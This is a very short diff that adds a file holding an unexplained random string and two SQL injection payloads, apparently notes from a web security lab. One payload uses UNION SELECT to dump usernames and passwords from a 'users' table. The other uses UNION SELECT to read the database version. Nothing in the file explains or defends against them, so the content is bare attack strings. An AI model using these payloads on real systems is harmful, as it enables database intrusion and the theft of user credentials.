@@ -1,0 +1,7 @@
+r0slmzpyxomrzewi8f6c
+
+'+UNION+SELECT+NULL,username||'~'||password+FROM+users--
+
+
+
+'+UNION+SELECT+ @ @version#
